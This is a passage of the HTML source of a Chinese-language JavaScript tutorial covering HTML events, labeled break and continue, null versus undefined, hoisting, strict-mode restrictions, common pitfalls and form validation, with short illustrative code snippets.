class="string">&quot;getElementById(&#x27;demo&#x27;).innerHTML=Date()&quot;</span>&gt;</span>现在的时间是?<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;this.innerHTML=Date()&quot;</span>&gt;</span>现在的时间是?<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;displayDate()&quot;</span>&gt;</span>现在的时间是?<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="常见的HTML事件"><a href="#常见的HTML事件" class="headerlink" title="常见的HTML事件"></a>常见的HTML事件</h2><p>onchangeHTML元素改变<br>onclick用户点击HTML元素<br>onmouseover鼠标指针移动到指定元素上时发生<br>onmouseout用户从一个HTML元素上移开鼠标时发生<br>onkeydown用户按下键盘按键<br>onload浏览器已完成页面的加载</p><h2 id="Javascript可以做的事"><a href="#Javascript可以做的事" class="headerlink" title="Javascript可以做的事"></a>Javascript可以做的事</h2><p>事件可以用于处理表单验证，用户输入，用户行为及浏览器动作:</p><ul><li>页面加载时触发事件</li><li>页面关闭时触发事件</li><li>用户点击按钮执行动作</li><li>验证用户输入内容的合法性</li></ul><h2 id="可以使用多种方法来执行-JavaScript-事件代码："><a href="#可以使用多种方法来执行-JavaScript-事件代码：" class="headerlink" title="可以使用多种方法来执行 JavaScript 事件代码："></a>可以使用多种方法来执行 JavaScript 事件代码：</h2><ul><li>HTML 事件属性可以直接执行 JavaScript 代码</li><li>HTML 事件属性可以调用 JavaScript 函数</li><li>可以为 HTML 元素指定自己的事件处理程序</li><li>可以阻止事件的发生。</li></ul><h1 id="break-和-continue-语句"><a href="#break-和-continue-语句" class="headerlink" title="break 和 continue 语句"></a>break 和 continue 语句</h1><p>可以对 JavaScript 语句进行标记。如需标记 JavaScript 语句，请在语句之前加上冒号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">label:</span><br><span class="line">statements</span><br></pre></td></tr></table></figure><p>break 和 continue 语句仅仅是能够跳出代码块的语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">break labelname; </span><br><span class="line">continue labelname;</span><br></pre></td></tr></table></figure><p>continue 语句（带有或不带标签引用）只能用在循环中。<br>break 语句（不带标签引用），只能用在循环或 switch 中。<br>通过标签引用，break 语句可用于跳出任何 JavaScript 代码块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cars=[<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Ford&quot;</span>];</span><br><span class="line"><span class="attr">list</span>: </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">0</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">1</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">2</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="keyword">break</span> list;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">3</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">4</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[<span class="number">5</span>] + <span class="string">&quot;&lt;br&gt;&quot;</span>); </span><br><span class="line">&#125;<span class="comment">// break之后的代码不会执行</span></span><br></pre></td></tr></table></figure><h1 id="null-和-undefined"><a href="#null-和-undefined" class="headerlink" title="null 和 undefined"></a>null 和 undefined</h1><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p>在 JavaScript 中 null 表示 “什么都没有”。<br>null是一个只有一个值的特殊类型。表示一个空对象引用。<br>可以设置为 null 来清空对象<br>null主动释放一个变量引用的对象，表示一个变量不再指向任何对象地址。</p><h2 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h2><p>在 JavaScript 中, undefined 是一个没有设置值的变量。<br>typeof 一个没有值的变量会返回 undefined。<br>可以设置为 undefined 来清空对象<br>undefined是所有没有赋值变量的默认值，自动赋值。</p><h2 id="undefined-和-null-的区别"><a href="#undefined-和-null-的区别" class="headerlink" title="undefined 和 null 的区别"></a>undefined 和 null 的区别</h2><p>null 和 undefined 的值相等，但类型不等</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>             <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>                  <span class="comment">// object</span></span><br><span class="line"><span class="literal">null</span> === <span class="literal">undefined</span>           <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">undefined</span>            <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><p>Number() 转换为数字， String() 转换为字符串， Boolean() 转换为布尔值。</p><h2 id="数据类型-2"><a href="#数据类型-2" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型：string . number . boolean . object . function . symbol<br>对象类型：Object . Date . Array<br>不包含任何值的数据类型：null . undefined<br>注意：<br>NaN 的数据类型是 number<br>数组(Array)的数据类型是 object<br>日期(Date)的数据类型为 object<br>null 的数据类型是 object<br>未定义变量的数据类型为 undefined<br>如果对象是 JavaScript Array 或 JavaScript Date ，我们就无法通过 typeof 来判断他们的类型，因为都是 返回 object。</p><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>constructor 属性返回所有 JavaScript 变量的构造函数。</p><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p><strong>search()</strong> 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。<br><strong>replace()</strong> 方法用于在字符串中用一些字符串替换另一些字符串，或替换一个与正则表达式匹配的子串。<br><strong>test()</strong> 方法是一个正则表达式方法。test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。<br><strong>exec()</strong> 方法是一个正则表达式方法。exec() 方法用于检索字符串中的正则表达式的匹配。该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。<br>使用 RegExp 对象<br>在 JavaScript 中，RegExp 对象是一个预定义了属性和方法的正则表达式对象。</p><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>浏览器点击F12，选择Sources,设置断点进行代码调试即可（要在js中才行）。<br>debugger 关键字用于停止执行 JavaScript，并调用调试函数。这个关键字与在调试工具中设置断点的效果是一样的。如果没有调试可用，debugger 语句将无法工作。</p><h1 id="声明提升-hoisting"><a href="#声明提升-hoisting" class="headerlink" title="声明提升(hoisting)"></a>声明提升(hoisting)</h1><p>JavaScript 中，函数及变量的声明都将被提升到函数的最顶部。<br>JavaScript 中，变量可以在使用后声明，也就是变量可以先使用再声明。</p><ul><li>JavaScript 初始化不会提升<br>JavaScript 只有声明的变量会提升，初始化的不会。<br>实例：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>; <span class="comment">// 初始化 x</span></span><br><span class="line">elem = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>); <span class="comment">// 查找元素</span></span><br><span class="line">elem.<span class="property">innerHTML</span> = x + <span class="string">&quot; &quot;</span> + y;           <span class="comment">// 显示 x 和 y</span></span><br><span class="line"><span class="keyword">var</span> y = <span class="number">7</span>; <span class="comment">// 初始化 y</span></span><br></pre></td></tr></table></figure>y 输出了 undefined，这是因为变量声明 (var y) 提升了，但是初始化(y &#x3D; 7) 并不会提升，所以 y 变量是一个未定义的变量。</li><li>在头部声明你的变量<br>通常我们在每个作用域开始前声明这些变量，这也是正常的 JavaScript 解析步骤，易于我们理解。</li></ul><h1 id="严格模式-use-strict"><a href="#严格模式-use-strict" class="headerlink" title="严格模式(use strict)"></a>严格模式(use strict)</h1><p>JavaScript 严格模式（strict mode）即在严格的条件下运行</p><h2 id="使用-“use-strict”-指令"><a href="#使用-“use-strict”-指令" class="headerlink" title="使用 “use strict” 指令"></a>使用 “use strict” 指令</h2><p>“use strict” 指令在 JavaScript 1.8.5 (ECMAScript5) 中新增。<br>它不是一条语句，但是是一个字面量表达式，在 JavaScript 旧版本中会被忽略。<br>“use strict” 的目的是指定代码在严格条件下执行。<br>严格模式下不能使用未声明的变量。</p><h2 id="严格模式声明"><a href="#严格模式声明" class="headerlink" title="严格模式声明"></a>严格模式声明</h2><p>严格模式通过在脚本或函数的头部添加 <code>use strict</code> ; 表达式来声明。<br>实例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="title function_">myFunction</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">    y = <span class="number">3.14</span>;   <span class="comment">// 报错 (y 未定义)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么使用严格模式:</p><ul><li>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</li><li>消除代码运行的一些不安全之处，保证代码运行的安全；</li><li>提高编译器效率，增加运行速度；</li><li>为未来新版本的Javascript做好铺垫。</li></ul><h2 id="严格模式的限制"><a href="#严格模式的限制" class="headerlink" title="严格模式的限制"></a>严格模式的限制</h2><ul><li><p>不允许使用未声明的变量</p></li><li><p>不允许删除变量或对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">p1, p2</span>) &#123;&#125;;</span><br><span class="line"><span class="keyword">delete</span> x;  </span><br></pre></td></tr></table></figure></li><li><p>不允许变量重名</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">p1, p1</span>) &#123;&#125;;</span><br></pre></td></tr></table></figure></li><li><p>不允许使用八进制</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> x = <span class="number">010</span>; </span><br></pre></td></tr></table></figure></li><li><p>不允许使用转义字符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> x = \<span class="number">010</span>;</span><br></pre></td></tr></table></figure></li><li><p>不允许对只读属性赋值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&quot;x&quot;</span>, &#123;<span class="attr">value</span>:<span class="number">0</span>, <span class="attr">writable</span>:<span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">obj.<span class="property">x</span> = <span class="number">3.14</span>;  </span><br></pre></td></tr></table></figure></li><li><p>不允许对一个使用getter方法读取的属性进行赋值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="keyword">get</span> <span class="title function_">x</span>() &#123;<span class="keyword">return</span> <span class="number">0</span>&#125; &#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="property">x</span> = <span class="number">3.14</span>;            <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li><li><p>不允许删除一个不允许删除的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li><li><p>变量名不能使用 “eval” 字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">eval</span> = <span class="number">3.14</span>;         <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li><li><p>变量名不能使用 “arguments” 字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">arguments</span> = <span class="number">3.14</span>;    <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li><li><p>不允许使用以下这种语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">with</span> (<span class="title class_">Math</span>)&#123;x = <span class="title function_">cos</span>(<span class="number">2</span>)&#125;; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li><li><p>由于一些安全原因，在作用域 eval() 创建的变量不能被调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="built_in">eval</span> (<span class="string">&quot;var x = 2&quot;</span>);</span><br><span class="line">alert (x);               <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li><li><p>禁止this关键字指向全局对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="variable language_">this</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 返回false，因为&quot;this&quot;指向全局对象，&quot;!this&quot;就是false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123; </span><br><span class="line">    <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> !<span class="variable language_">this</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 返回true，因为严格模式下，this的值为undefined，所以&quot;!this&quot;为true。</span></span><br></pre></td></tr></table></figure><p>因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">f</span>();<span class="comment">// 报错，this未定义</span></span><br></pre></td></tr></table></figure></li></ul><p>注意：”use strict” 指令只允许出现在脚本或函数的开头</p><h1 id="使用误区"><a href="#使用误区" class="headerlink" title="使用误区"></a>使用误区</h1><h2 id="比较运算符常见错误"><a href="#比较运算符常见错误" class="headerlink" title="比较运算符常见错误"></a>比较运算符常见错误</h2><p>switch 语句会使用恒等计算符(&#x3D;&#x3D;&#x3D;)进行比较<br>以下实例由于类型不一致不会执行 alert 弹窗：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">switch</span>(x) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;10&quot;</span>: <span class="title function_">alert</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="浮点型数据使用注意事项"><a href="#浮点型数据使用注意事项" class="headerlink" title="浮点型数据使用注意事项"></a>浮点型数据使用注意事项</h2><p>JavaScript 中的所有数据都是以 64 位<strong>浮点型数据(float)</strong> 来存储。<br>所有的编程语言，包括 JavaScript，对浮点型数据的精确度都很难确定</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">0.1</span>;</span><br><span class="line"><span class="keyword">var</span> y = <span class="number">0.2</span>;</span><br><span class="line"><span class="keyword">var</span> z = x + y            <span class="comment">// z 的结果为 0.30000000000000004</span></span><br><span class="line"><span class="keyword">if</span> (z == <span class="number">0.3</span>)            <span class="comment">// 返回 false</span></span><br></pre></td></tr></table></figure><p>为解决以上问题，可以用整数的乘除法来解决：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> z = (x * <span class="number">10</span> + y * <span class="number">10</span>) / <span class="number">10</span>;       <span class="comment">// z 的结果为 0.3</span></span><br></pre></td></tr></table></figure><h2 id="JavaScript-字符串分行"><a href="#JavaScript-字符串分行" class="headerlink" title="JavaScript 字符串分行"></a>JavaScript 字符串分行</h2><p>JavaScript 允许我们在字符串中使用断行语句:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x =</span><br><span class="line"><span class="string">&quot;Hello World!&quot;</span>;</span><br></pre></td></tr></table></figure><p>但是，在字符串中直接使用回车换行是会报错的,字符串断行需要使用反斜杠()，如下所示:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">&quot;Hello \</span></span><br><span class="line"><span class="string">World!&quot;</span>;</span><br></pre></td></tr></table></figure><p>注意：不用对 return 语句进行断行。</p><h2 id="数组中使用名字来索引"><a href="#数组中使用名字来索引" class="headerlink" title="数组中使用名字来索引"></a>数组中使用名字来索引</h2><p>许多程序语言都允许使用名字来作为数组的索引。<br>使用名字来作为索引的数组称为关联数组(或哈希)。<br>JavaScript 不支持使用名字来索引数组，只允许使用数字索引<br>在 JavaScript 中, 对象 使用 名字作为索引。<br>如果你使用名字作为索引，当访问数组时，JavaScript 会把数组重新定义为标准对象。<br>执行这样操作后，数组的方法及属性将不能再使用，否则会产生错误:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = [];</span><br><span class="line">person[<span class="string">&quot;firstName&quot;</span>] = <span class="string">&quot;John&quot;</span>;</span><br><span class="line">person[<span class="string">&quot;lastName&quot;</span>] = <span class="string">&quot;Doe&quot;</span>;</span><br><span class="line">person[<span class="string">&quot;age&quot;</span>] = <span class="number">46</span>;</span><br><span class="line"><span class="keyword">var</span> x = person.<span class="property">length</span>;         <span class="comment">// person.length 返回 0</span></span><br><span class="line"><span class="keyword">var</span> y = person[<span class="number">0</span>];             <span class="comment">// person[0] 返回 undefined</span></span><br></pre></td></tr></table></figure><h2 id="定义数组元素和对象，最后不能添加逗号"><a href="#定义数组元素和对象，最后不能添加逗号" class="headerlink" title="定义数组元素和对象，最后不能添加逗号"></a>定义数组元素和对象，最后不能添加逗号</h2><p>数组最后一个值的后面添加逗号虽然语法没有问题，但是在不同的浏览器可能得到不同的结果。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> colors = [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>,]; <span class="comment">//这样数组的长度可能为3 也可能为4。</span></span><br></pre></td></tr></table></figure><h2 id="Undefined-不是-Null"><a href="#Undefined-不是-Null" class="headerlink" title="Undefined 不是 Null"></a>Undefined 不是 Null</h2><p>在 JavaScript 中, <strong>null</strong> 用于对象, <strong>undefined</strong> 用于变量，属性和方法。<br>对象只有被定义才有可能为 null，否则为 undefined。<br>如果我们想测试对象是否存在，在对象还没定义时将会抛出一个错误。<br>正确的方式是我们需要先使用 typeof 来检测对象是否已定义：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> myObj !== <span class="string">&quot;undefined&quot;</span> &amp;&amp; myObj !== <span class="literal">null</span>)</span><br></pre></td></tr></table></figure><h2 id="程序块作用域"><a href="#程序块作用域" class="headerlink" title="程序块作用域"></a>程序块作用域</h2><p>在每个代码块中 JavaScript 不会创建一个新的作用域，一般各个代码块的作用域都是全局的。</p><h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><h2 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h2><p>HTML 表单验证可以通过 JavaScript 来完成。<br>以下实例代码用于判断表单字段(fname)值是否存在， 如果不存在，就弹出信息，阻止表单提交：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;myForm&quot;</span>][<span class="string">&quot;fname&quot;</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="literal">null</span> || x == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;需要输入名字。&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上 JavaScript 代码可以通过 HTML 代码来调用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;myForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;demo_form.php&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return validateForm()&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">名字: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fname&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>onsubmit&#x3D;”return validateForm()”</strong> 当验证不通过时，返回 false，可以阻止表单提交。</p><h2 id="HTML-表单自动验证"><a href="#HTML-表单自动验证" class="headerlink" title="HTML 表单自动验证"></a>HTML 表单自动验证</h2><p>HTML 表单验证也可以通过浏览器来自动完成。<br>如果表单字段 (fname) 的值为空, required 属性会阻止表单提交：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;demo_form.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fname&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数据验证"><a href="#数据验证" class="headerlink" title="数据验证"></a>数据验证</h2><p><strong>服务端数据验证</strong>是在数据提交到服务器上后再验证。<br><strong>客户端数据验证</strong>是在数据发送到服务器前，在浏览器上完成验证。</p><h2 id="HTML-约束验证"><a href="#HTML-约束验证" class="headerlink" title="HTML 约束验证"></a>HTML 约束验证</h2><p>HTML5 新增了 HTML 表单的验证方式：约束验证（constraint validation）。<br>约束验证是表单被提交时浏览器用来实现验证的一种算法。<br>HTML 约束验证基于：</p><ul><li>HTML 输入属性</li><li>CSS 伪类选择器</li><li>DOM 属性和方法</li></ul><h3 id="约束验证-HTML-输入属性"><a href="#约束验证-HTML-输入属性" class="headerlink" title="约束验证 HTML 输入属性"></a>约束验证 HTML 输入属性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">属性 描述</span><br><span class="line">disabled规定输入的元素不可用</span><br><span class="line">max规定输入元素的最大值</span><br><span class="line">min  规定输入元素的最小值</span><br><span class="line">pattern规定输入元素值的模式</span><br><span class="line">required归档输入元素字段是必需的</span><br><span class="line">type 规定输入元素的类型</span><br></pre></td></tr></table></figure><h3 id="约束验证-CSS-伪类选择器"><a href="#约束验证-CSS-伪类选择器" class="headerlink" title="约束验证 CSS 伪类选择器"></a>约束验证 CSS 伪类选择器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选择器  描述</span><br><span class="line">:disabled选取属性为“disabled”属性的input元素</span><br><span class="line">:invalid选取无效的input元素</span><br><span class="line">:optional选择没有“optional”属性的input元素</span><br><span class="line">:valid 选择有效值的input元素</span><br></pre></td></tr></table></figure><h1 id="验证-API"><a href="#验证-API" class="headerlink" title="验证 API"></a>验证 API</h1><h2 id="约束验证-DOM-方法"><a href="#约束验证-DOM-方法" class="headerlink" title="约束验证 DOM 方法"></a>约束验证 DOM 方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checkValidity()</span><br><span class="line">如果input元素中的数据是合法的返回true，否则返回false。HTMLSelectElement.checkValidity() 会检查元素是否有任何输入约束条件，并且检查值是否符合约束条件。 如果值是不符合约束条件的，浏览器就会在该元素上触发一个可以撤销的 invalid 事件。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setCustomValidity()</span><br><span 